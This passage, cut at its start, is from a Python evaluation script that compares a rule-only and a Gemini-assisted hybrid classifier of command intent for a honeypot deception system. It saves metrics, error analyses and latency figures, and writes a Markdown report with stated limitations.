                "test_id": r["test_id"],
                "expected": r["expected_intent"],
                "rule": r["rule_intent"],
                "hybrid": r["hybrid_intent"],
                "source": r["hybrid_source"],
                "rule_correct": r["rule_correct"],
                "hybrid_correct": r["hybrid_correct"],
                "outcome": (
                    "IMPROVED" if not r["rule_correct"] and r["hybrid_correct"] else
                    "DEGRADED" if r["rule_correct"] and not r["hybrid_correct"] else
                    "UNCHANGED"
                ),
            })

    # False positive / negative detail
    errors = []
    for r in results:
        if not r["hybrid_correct"]:
            errors.append({
                "test_id": r["test_id"],
                "expected_intent": r["expected_intent"],
                "predicted_intent": r["hybrid_intent"],
                "rule_intent": r["rule_intent"],
                "source": r["hybrid_source"],
                "gemini_attempted": r["gemini_attempted"],
                "gemini_succeeded": r["gemini_invoked_and_succeeded"],
                "error_type": "FP" if r["hybrid_intent"] != r["expected_intent"] else "FN",
                "analysis": _error_analysis(r),
            })

    metrics_output = {
        "evaluation_timestamp": EVAL_TIMESTAMP,
        "phase": "Phase 10 - Unseen/Ambiguous Behaviour Evaluation",
        "software_version": "v1.0-RC (FROZEN)",
        "total_cases": total,
        "gemini_api_available": gemini_api_available,
        "gemini_enabled_config": gemini_clf.enabled,
        "gemini_model": "gemini-2.5-flash",
        "case_type_counts": {
            ct: sum(1 for c in UNSEEN_CASES if c["case_type"] == ct)
            for ct in ["A", "B", "C", "D"]
        },
        "gemini_usage": {
            "gemini_attempted": gemini_attempted_count,
            "gemini_invocation_rate_pct": round(100 * gemini_attempted_count / total, 1),
            "gemini_succeeded": gemini_succeeded_count,
            "gemini_fallback": fallback_count,
            "rule_only_resolved": rule_resolved_count,
            "changed_predictions": gemini_changed_count,
        },
        "rule_metrics": {
            "accuracy": rule_metrics["accuracy"],
            "macro_precision": rule_metrics["macro_precision"],
            "macro_recall": rule_metrics["macro_recall"],
            "macro_f1": rule_metrics["macro_f1"],
            "weighted_f1": rule_metrics["weighted_f1"],
        },
        "hybrid_metrics": {
            "accuracy": hybrid_metrics["accuracy"],
            "macro_precision": hybrid_metrics["macro_precision"],
            "macro_recall": hybrid_metrics["macro_recall"],
            "macro_f1": hybrid_metrics["macro_f1"],
            "weighted_f1": hybrid_metrics["weighted_f1"],
        },
        "per_class_comparison": per_class_comparison,
        "hybrid_value_cases": hybrid_value_detail,
        "errors": errors,
        "latency_ms": {
            "rule_avg": rule_avg, "rule_min": rule_min, "rule_max": rule_max,
            "hybrid_avg": hybrid_avg, "hybrid_min": hybrid_min, "hybrid_max": hybrid_max,
            "gemini_avg": gemini_avg, "gemini_min": gemini_min, "gemini_max": gemini_max,
            "gemini_samples": len(gemini_latencies_ms),
            "methodology": (
                "Gemini client pre-warmed before timing. "
                "Rule latency = time for rule_clf.classify() alone. "
                "Hybrid latency = time for hybrid_clf.classify() including Gemini if invoked. "
                "Gemini latency = hybrid_latency - rule_latency for cases where Gemini was attempted."
            ),
        },
        "statistical_note": (
            f"Dataset contains {total} cases. Metrics are illustrative of system behavior, "
            "not statistically significant for production-level performance claims."
        ),
    }
    with open(EVAL_DIR / "unseen_metrics.json", "w", encoding="utf-8") as f:
        json.dump(metrics_output, f, indent=2, default=str)
    print(f"  [+] Saved: unseen_metrics.json")

    # (f) evaluation report
    _write_report(metrics_output, results, hybrid_value_detail, errors,
                  gemini_attempted_count, total, rule_metrics, hybrid_metrics,
                  rule_avg, hybrid_avg, gemini_avg, gemini_api_available, fallback_count)

    # -- Final summary --------------------------------------------------------
    print("\n" + "=" * 72)
    print("[PHASE 10] FINAL SUMMARY")
    print("=" * 72)
    print(f"  Cases             : {total}")
    print(f"  Rule-resolved     : {rule_resolved_count}")
    print(f"  Gemini attempted  : {gemini_attempted_count} ({100*gemini_attempted_count/total:.1f}%)")
    print(f"  Gemini succeeded  : {gemini_succeeded_count}")
    print(f"  Gemini FALLBACK   : {fallback_count}")
    print(f"  Changed preds     : {gemini_changed_count}")
    print(f"  Rule accuracy     : {rule_metrics['accuracy']:.4f}")
    print(f"  Hybrid accuracy   : {hybrid_metrics['accuracy']:.4f}")
    print(f"  Rule macro F1     : {rule_metrics['macro_f1']:.4f}")
    print(f"  Hybrid macro F1   : {hybrid_metrics['macro_f1']:.4f}")
    print(f"  Rule avg latency  : {rule_avg} ms")
    print(f"  Hybrid avg latency: {hybrid_avg} ms")
    print(f"  Gemini avg latency: {gemini_avg} ms ({len(gemini_latencies_ms)} samples)")
    print(f"\n  Output: {EVAL_DIR}")
    print("=" * 72 + "\n")

    return metrics_output


def _error_analysis(r: Dict) -> str:
    """Generate a short explanation for misclassification."""
    if r["hybrid_source"] == "FALLBACK":
        return (
            f"Gemini was attempted but failed (API unavailable). "
            f"Fell back to rule result '{r['rule_intent']}'. "
            f"With working Gemini, '{r['expected_intent']}' would likely be classified correctly."
        )
    elif r["rule_intent"] == r["hybrid_intent"] == "OTHER":
        return (
            f"No rule matched this command and Gemini was not available. "
            f"System defaulted to OTHER. Expected: {r['expected_intent']}."
        )
    elif r["rule_intent"] == r["hybrid_intent"] != r["expected_intent"]:
        return (
            f"Rule matched '{r['rule_intent']}' (incorrect for this command's true intent). "
            f"Rule confidence may have been too high for Gemini override, "
            f"or Gemini confirmed the rule's (incorrect) classification."
        )
    else:
        return f"Hybrid returned '{r['hybrid_intent']}', expected '{r['expected_intent']}'."


def _write_report(
    metrics_output, results, hybrid_value, errors,
    gemini_attempted, total, rule_m, hybrid_m,
    rule_avg, hybrid_avg, gemini_avg, gemini_available, fallback_count
):
    lines = [
        "# Phase 10 - Unseen / Ambiguous Behaviour Evaluation Report",
        "## Intent-Aware Deception System v1.0 RC (FROZEN)",
        "",
        f"> **Evaluation Date**: {EVAL_TIMESTAMP}  ",
        "> **Production code**: NOT MODIFIED.  ",
        f"> **Gemini API Available**: {'YES' if gemini_available else 'NO (API key missing or unreachable)'}",
        "",
        "---",
        "",
        "## Objective",
        "",
        "Phase 9 evaluated 42 cases derived directly from rule signatures, achieving",
        "perfect scores (Accuracy=1.0). Phase 10 evaluates the same frozen classifier",
        "on **28 cases designed to NOT match existing rule patterns**, to test whether",
        "the Gemini layer provides measurable value on novel and ambiguous behaviour.",
        "",
        "## Case Type Taxonomy",
        "",
        "| Type | Description | Count |",
        "| :--- | :--- | ---: |",
        f"| A | No rule match -> rule=OTHER(0.30) -> Gemini primary | {metrics_output['case_type_counts']['A']} |",
        f"| B | Partial rule match (conf <0.90) -> Gemini consulted | {metrics_output['case_type_counts']['B']} |",
        f"| C | Rule matches WRONG intent -> tests Gemini correction | {metrics_output['case_type_counts']['C']} |",
        f"| D | Control/benign (should remain OTHER) | {metrics_output['case_type_counts']['D']} |",
        "",
        "---",
        "",
        "## Task 3 - Gemini Usage",
        "",
        "| Metric | Value |",
        "| :--- | ---: |",
        f"| Total cases | {total} |",
        f"| Rule-only resolved (Gemini not attempted) | {metrics_output['gemini_usage']['rule_only_resolved']} |",
        f"| Gemini attempted | {gemini_attempted} ({metrics_output['gemini_usage']['gemini_invocation_rate_pct']}%) |",
        f"| Gemini succeeded (source=GEMINI/HYBRID) | {metrics_output['gemini_usage']['gemini_succeeded']} |",
        f"| Gemini FALLBACK (attempted, failed) | {fallback_count} |",
        f"| Changed predictions | {metrics_output['gemini_usage']['changed_predictions']} |",
        "",
    ]

    if not gemini_available:
        lines += [
            "> [!WARNING]",
            "> **Gemini API was unavailable during this evaluation.** All FALLBACK results represent",
            "> cases where Gemini was attempted but received no valid response (likely missing API key).",
            "> The Gemini layer's classification contribution CANNOT be measured from this run.",
            "> The hybrid accuracy reported below reflects rule engine + OTHER fallback only.",
            "",
        ]

    lines += [
        "---",
        "",
        "## Task 4 - Classification Metrics",
        "",
        "> **Statistical note**: 28 cases is illustrative. Metrics are not statistically significant",
        "> for production-level performance claims.",
        "",
        "| Metric | Rule-Only | Hybrid | Delta |",
        "| :--- | ---: | ---: | ---: |",
    ]
    for k, label in [
        ("accuracy", "Accuracy"),
        ("macro_precision", "Macro Precision"),
        ("macro_recall", "Macro Recall"),
        ("macro_f1", "Macro F1"),
        ("weighted_f1", "Weighted F1"),
    ]:
        r_val = rule_m[k]
        h_val = hybrid_m[k]
        delta = round(h_val - r_val, 4)
        delta_str = f"+{delta:.4f}" if delta > 0 else f"{delta:.4f}"
        lines.append(f"| {label} | {r_val:.4f} | {h_val:.4f} | {delta_str} |")

    lines += [
        "",
        "### Per-Class Comparison",
        "",
        "| Intent | Support | Rule P | Rule R | Rule F1 | Hybrid P | Hybrid R | Hybrid F1 |",
        "| :--- | ---: | ---: | ---: | ---: | ---: | ---: | ---: |",
    ]
    for cls, v in sorted(metrics_output["per_class_comparison"].items()):
        lines.append(
            f"| {cls} | {v['support']} | {v['rule_precision']:.4f} | {v['rule_recall']:.4f} | {v['rule_f1']:.4f} | "
            f"{v['hybrid_precision']:.4f} | {v['hybrid_recall']:.4f} | {v['hybrid_f1']:.4f} |"
        )

    lines += [
        "",
        "---",
        "",
        "## Task 5 - Hybrid Value Analysis",
        "",
        "All cases where Gemini was attempted (source != RULE):",
        "",
        "| Test ID | Expected | Rule Output | Hybrid Output | Source | Outcome |",
        "| :--- | :--- | :--- | :--- | :--- | :--- |",
    ]
    for v in hybrid_value:
        lines.append(
            f"| {v['test_id']} | {v['expected']} | {v['rule']} | {v['hybrid']} | {v['source']} | **{v['outcome']}** |"
        )

    lines += [
        "",
        "---",
        "",
        "## Task 6 - False Positive / False Negative Analysis",
        "",
    ]
    if errors:
        lines += [
            "| Test ID | Expected | Predicted | Rule Output | Source | Analysis |",
            "| :--- | :--- | :--- | :--- | :--- | :--- |",
        ]
        for e in errors:
            lines.append(
                f"| {e['test_id']} | {e['expected_intent']} | {e['predicted_intent']} | "
                f"{e['rule_intent']} | {e['source']} | {e['analysis'][:120]} |"
            )
    else:
        lines.append("No classification errors in this evaluation run.")

    lines += [
        "",
        "---",
        "",
        "## Task 7 - Latency",
        "",
        "> **Methodology**: Gemini client pre-warmed before timing begins.",
        "> Rule latency = time for `rule_clf.classify()` only.",
        "> Hybrid latency = time for `hybrid_clf.classify()` including Gemini if invoked.",
        "> Gemini latency = estimated as `hybrid - rule` for invocation cases.",
        "",
        "| Component | Avg (ms) | Min (ms) | Max (ms) |",
        "| :--- | ---: | ---: | ---: |",
        f"| Rule Classifier | {rule_avg} | {metrics_output['latency_ms']['rule_min']} | {metrics_output['latency_ms']['rule_max']} |",
        f"| Hybrid Pipeline | {hybrid_avg} | {metrics_output['latency_ms']['hybrid_min']} | {metrics_output['latency_ms']['hybrid_max']} |",
        f"| Gemini (estimated) | {gemini_avg or 'N/A'} | {metrics_output['latency_ms']['gemini_min'] or 'N/A'} | {metrics_output['latency_ms']['gemini_max'] or 'N/A'} |",
        "",
        "---",
        "",
        "## Interpretation: Did the Hybrid Architecture Demonstrate Measurable Benefit?",
        "",
    ]

    if metrics_output["gemini_usage"]["gemini_succeeded"] == 0:
        lines += [
            "> [!CAUTION]",
            "> **Gemini was unavailable in this evaluation run.** The hybrid architecture",
            "> CANNOT be evaluated for Gemini-added value in this run.",
            "",
            "The evaluation demonstrates the **failure mode** of the hybrid system when the",
            "Gemini API is unavailable: all novel/ambiguous commands that lack rule matches fall",
            "through to `FALLBACK` with `intent=OTHER`, potentially misclassifying them.",
            "",
            "**Implication for academic report**:",
            "- The rule engine achieves high accuracy on commands within its signature vocabulary.",
            "- For novel commands outside rule patterns, the system requires a working Gemini API",
            "  to avoid defaulting to `OTHER`.",
            "- The hybrid architecture's value proposition depends on Gemini availability.",
            "- This is a valid architectural finding: the system degrades gracefully but loses",
            "  classification capability for novel behaviours when Gemini is offline.",
        ]
    else:
        improved = sum(1 for v in hybrid_value if v["outcome"] == "IMPROVED")
        degraded = sum(1 for v in hybrid_value if v["outcome"] == "DEGRADED")
        lines += [
            f"Gemini was invoked and succeeded on **{metrics_output['gemini_usage']['gemini_succeeded']}** cases.",
            f"Of these: **{improved} improved**, **{degraded} degraded**, rest unchanged.",
            "",
            f"Hybrid accuracy ({hybrid_m['accuracy']:.4f}) vs Rule-only ({rule_m['accuracy']:.4f}).",
        ]

    lines += [
        "",
        "---",
        "",
        "## Limitations",
        "",
        "1. **28 cases** - too small for statistical significance.",
        "2. **Gemini variability** - LLM responses are non-deterministic; re-running may yield different results.",
        "3. **Synthetic events** - NormalizedEvent objects mirror Cowrie structure but are not raw JSON from a live session.",
        "4. **Gemini API dependency** - If API key is missing or times out, all novel-command classifications fall to OTHER.",
        "5. **Case design** - Cases were authored by the experimenter, introducing selection bias.",
        "6. **No multi-event context** - Single-event evaluation does not test session-level context influence.",
        "",
        "---",
        "",
        "## Generated Files",
        "",
        "| File | Description |",
        "| :--- | :--- |",
        "| `unseen_dataset.csv` | 28 labelled unseen cases |",
        "| `unseen_results.csv` | Per-case results with rule, Gemini, hybrid outputs |",
        "| `unseen_metrics.json` | All metrics, hybrid value analysis, error analysis |",
        "| `confusion_matrix_rule.png` | Rule-only confusion matrix |",
        "| `confusion_matrix_hybrid.png` | Hybrid confusion matrix |",
        "| `latency_results.csv` | Latency breakdown |",
        "| `unseen_evaluation_report.md` | This document |",
    ]

    report_path = EVAL_DIR / "unseen_evaluation_report.md"
    with open(report_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    print(f"  [+] Saved: unseen_evaluation_report.md")


if __name__ == "__main__":
    run_phase10()
